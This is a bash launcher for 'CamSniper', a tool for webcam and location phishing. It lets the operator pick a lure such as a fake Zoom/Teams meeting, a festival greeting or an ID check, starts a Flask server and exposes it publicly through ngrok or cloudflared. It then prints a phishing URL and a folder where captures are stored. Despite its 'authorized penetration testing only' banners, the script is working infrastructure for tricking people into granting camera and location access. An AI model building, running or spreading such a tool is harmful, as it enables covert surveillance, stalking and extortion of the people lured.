#!/bin/bash
# ============================================================
#   CamSniper v1.0 - Advanced Webcam Phishing Simulation Tool
#   For authorized penetration testing only.
# ============================================================

TOOL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORT=8080
SELECTED_TEMPLATE="meeting"
FESTIVAL_NAME=""

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BLUE='\033[0;34m'; WHITE='\033[1;37m'
BOLD='\033[1m'; RESET='\033[0m'

trap cleanup EXIT INT TERM

cleanup() {
    echo -e "\n${YELLOW}[!] Shutting down CamSniper...${RESET}"
    pkill -f "server.py" 2>/dev/null
    pkill -f "ngrok" 2>/dev/null
    pkill -f "cloudflared" 2>/dev/null
    echo -e "${GREEN}[✓] Cleanup complete.${RESET}"
    exit 0
}

banner() {
    clear
    echo -e "${CYAN}"
    echo '  ██████╗ █████╗ ███╗   ███╗███████╗███╗   ██╗██╗██████╗ ███████╗██████╗ '
    echo ' ██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║██║██╔══██╗██╔══██╗██╔══██╗'
    echo ' ██║     ███████║██╔████╔██║███████╗██╔██╗ ██║██║██████╝██████╗  ██████╔╝'
    echo ' ██║     ██╔══██║██║╚██╔╝██║╚════██║██║╚██╗██║██║██╔══╝ ██╔══╝  ██╔══██╗'
    echo ' ╚██████╗██║  ██║██║ ╚═╝ ██║███████║██║ ╚██╗██║██║     ███████╗██║  ██║'
    echo '  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝'
    echo '                                    Github:- https://github.com/Kali-Prem'
    echo -e "${RESET}"
    echo -e "${WHITE}   ═══════════════════════════════════════════════════════${RESET}"
    echo -e "${YELLOW}   Advanced Webcam & Location Capture Tool for Red Teams${RESET}"
    echo -e "${RED}   FOR AUTHORIZED PENETRATION TESTING ONLY${RESET}"
    echo -e "${WHITE}   ═══════════════════════════════════════════════════════${RESET}\n"
}

check_deps() {
    echo -e "${CYAN}[*] Checking dependencies...${RESET}"
    python3 -c "import flask, flask_socketio, requests, colorama, rich" 2>/dev/null || {
        echo -e "${YELLOW}[!] Installing Python packages...${RESET}"
        pip3 install flask flask-socketio requests colorama rich -q
    }
    echo -e "${GREEN}[✓] Dependencies OK${RESET}\n"
}

select_template() {
    echo -e "${CYAN}╔════════════════════════════════════════╗"
    echo -e "║      SELECT PHISHING TEMPLATE          ║"
    echo -e "╚════════════════════════════════════════╝${RESET}\n"
    echo -e "  ${BOLD}[1]${RESET} 📹 Online Meeting      (Zoom/Teams clone)"
    echo -e "  ${BOLD}[2]${RESET} 📺 Live YouTube TV     (Streaming page)"
    echo -e "  ${BOLD}[3]${RESET} 🎉 Festival Wishes     (Greeting card)"
    echo -e "  ${BOLD}[4]${RESET} 📱 QR Code Scanner     (Camera test page)"
    echo -e "  ${BOLD}[5]${RESET} 🔒 Security Verify     (ID verification)"
    echo -e "  ${BOLD}[6]${RESET} 💬 Video Chat          (Social video chat)\n"
    read -rp "$(echo -e "${YELLOW}[?] Select template [1-6, default=1]: ${RESET}")" tmpl
    case "$tmpl" in
        2) SELECTED_TEMPLATE="youtube"   ;;
        3) SELECTED_TEMPLATE="festival"  ;;
        4) SELECTED_TEMPLATE="qrscanner" ;;
        5) SELECTED_TEMPLATE="security"  ;;
        6) SELECTED_TEMPLATE="videochat" ;;
        *) SELECTED_TEMPLATE="meeting"   ;;
    esac
    echo -e "${GREEN}[✓] Template: ${BOLD}$SELECTED_TEMPLATE${RESET}\n"

    # Ask for festival name if festival template selected
    if [ "$SELECTED_TEMPLATE" = "festival" ]; then
        read -rp "$(echo -e "${YELLOW}[?] Enter festival name (e.g. Diwali, Holi, Eid, Christmas): ${RESET}")" FESTIVAL_NAME
        [ -z "$FESTIVAL_NAME" ] && FESTIVAL_NAME="Festival"
        echo -e "${GREEN}[✓] Festival name set: ${BOLD}$FESTIVAL_NAME${RESET}\n"
    fi
}

start_ngrok() {
    command -v ngrok &>/dev/null || { echo -e "${RED}[✗] ngrok not found${RESET}"; echo -e "${YELLOW}[!] Install ngrok from: https://ngrok.com/download${RESET}"; TUNNEL_URL="http://localhost:$PORT"; return; }

    echo -e "${CYAN}[*] Checking ngrok authentication...${RESET}"

    # Check if ngrok is authenticated
    if ! ngrok config check &>/dev/null 2>&1; then
        echo -e "${RED}[✗] ngrok is NOT authenticated!${RESET}"
        echo ""
        echo -e "${YELLOW}╔══════════════════════════════════════════╗"
        echo -e "║  NGROK AUTHTOKEN REQUIRED                ║"
        echo -e "╚══════════════════════════════════════════╝${RESET}"
        echo ""
        echo -e "To create public tunnels, ngrok needs a free authtoken:"
        echo -e "  1. ${CYAN}https://dashboard.ngrok.com/get-started/setup${RESET}"
        echo -e "  2. Copy your authtoken from the dashboard"
        echo -e "  3. Run: ${CYAN}ngrok config add-authtoken YOUR_AUTHTOKEN${RESET}"
        echo ""
        echo -e "${RED}[!] Without auth token, ngrok cannot create public URLs.${RESET}"
        echo -e "${YELLOW}[!] Falling back to localhost URL...${RESET}"
        echo ""
        echo -e "${YELLOW}[!] Note: Camera & location will NOT work on mobile via localhost.${RESET}"
        echo -e "${YELLOW}[!]       For mobile testing, you MUST authenticate ngrok first.${RESET}"
        echo ""
        TUNNEL_URL="http://localhost:$PORT"
        return
    fi

    echo -e "${GREEN}[✓] ngrok authenticated${RESET}"

    # Free port 4040 (ngrok API) in case it's in use
    pkill -f ngrok 2>/dev/null; sleep 1
    fuser -k 4040/tcp 2>/dev/null; sleep 1

    echo -e "${CYAN}[*] Starting ngrok tunnel on port $PORT...${RESET}"
    ngrok http $PORT --log=stdout > /tmp/camsniper_ngrok.log 2>&1 &

    # Wait for ngrok to start and poll for tunnel URL (max 6 seconds = 3 attempts)
    TUNNEL_URL=""
    for i in $(seq 1 3); do
        sleep 2
        TUNNEL_URL=$(curl -s http://localhost:4040/api/tunnels 2>/dev/null | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin); t=d.get('tunnels',[])
    https=[x for x in t if x.get('proto')=='https']
    print((https or t)[0]['public_url'] if (https or t) else '')
except: print('')
" 2>/dev/null)
        if [ -n "$TUNNEL_URL" ]; then
            break
        fi
        echo -e "${YELLOW}[!] Waiting for ngrok tunnel... ($i/3)${RESET}"
    done

    [ -z "$TUNNEL_URL" ] && {
        echo -e "${RED}[✗] ngrok tunnel failed to start${RESET}"
        echo -e "${YELLOW}[!] Recent log:${RESET}"
        tail -5 /tmp/camsniper_ngrok.log 2>/dev/null
        echo ""
        echo -e "${RED}[!] Possible causes:${RESET}"
        echo -e "    • ngrok free tier limit reached"
        echo -e "    • Port 4040 blocked by firewall"
        echo -e "    • ngrok service temporarily unavailable"
        echo -e "${RED}[!] Falling back to localhost URL...${RESET}"
        TUNNEL_URL="http://localhost:$PORT"
    }
    echo -e "${GREEN}[✓] Ngrok: ${BOLD}$TUNNEL_URL${RESET}"
}

start_cloudflared() {
    command -v cloudflared &>/dev/null || { echo -e "${RED}[✗] cloudflared not found${RESET}"; TUNNEL_URL="http://localhost:$PORT"; return; }
    echo -e "${CYAN}[*] Starting cloudflared...${RESET}"
    cloudflared tunnel --url http://localhost:$PORT > /tmp/camsniper_cf.log 2>&1 &
    sleep 6
    TUNNEL_URL=$(grep -oP 'https://[a-z0-9\-]+\.trycloudflare\.com' /tmp/camsniper_cf.log | head -1)
    [ -z "$TUNNEL_URL" ] && TUNNEL_URL="http://localhost:$PORT"
    echo -e "${GREEN}[✓] Cloudflare: ${BOLD}$TUNNEL_URL${RESET}"
}

select_tunnel() {
    echo -e "${CYAN}╔═══════════════════════════════════════╗"
    echo -e "║         SELECT TUNNEL METHOD           ║"
    echo -e "╚═══════════════════════════════════════╝${RESET}\n"
    echo -e "  ${BOLD}[1]${RESET} 🌐 Ngrok               (Recommended)"
    echo -e "  ${BOLD}[2]${RESET} ☁️  Cloudflared         (Cloudflare)"
    echo -e "  ${BOLD}[3]${RESET} 🔗 LAN only            (No tunnel)\n"
    read -rp "$(echo -e "${YELLOW}[?] Select tunnel [1-3, default=1]: ${RESET}")" tc
    case "$tc" in
        2) start_cloudflared ;;
        3) TUNNEL_URL="http://$(hostname -I | awk '{print $1}'):$PORT" ;;
        *) start_ngrok ;;
    esac
    echo ""
}

start_server() {
    echo -e "${CYAN}[*] Starting Flask server on port $PORT...${RESET}"
    cd "$TOOL_DIR"
    python3 server.py --port "$PORT" --template "$SELECTED_TEMPLATE" &
    sleep 2
    echo -e "${GREEN}[✓] Server started${RESET}\n"
}

show_info() {
    echo -e "${CYAN}╔══════════════════════════════════════════════════════╗"
    echo -e "║               CAMSNIPER READY                        ║"
    echo -e "╚══════════════════════════════════════════════════════╝${RESET}"
    echo ""

    # Build URL with festival name parameter
    if [ "$SELECTED_TEMPLATE" = "festival" ] && [ -n "$FESTIVAL_NAME" ]; then
        PHISH_URL="${TUNNEL_URL}/${SELECTED_TEMPLATE}?fes_name=${FESTIVAL_NAME}"
    else
        PHISH_URL="${TUNNEL_URL}/${SELECTED_TEMPLATE}"
    fi

    echo -e "  ${GREEN}📡 Phishing URL  : ${BOLD}${PHISH_URL}${RESET}"
    echo -e "  ${YELLOW}🖥️  Dashboard     : ${BOLD}http://localhost:${PORT}/dashboard${RESET}"
    echo -e "  ${BLUE}📂 Captures      : ${BOLD}${TOOL_DIR}/captures/${RESET}"
    echo ""
    echo -e "${RED}  ⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY${RESET}"
    echo ""
    echo -e "${WHITE}  Press Ctrl+C to stop${RESET}\n"
    python3 monitor.py "$TOOL_DIR"
}

banner
check_deps
select_template
select_tunnel
start_server
show_info
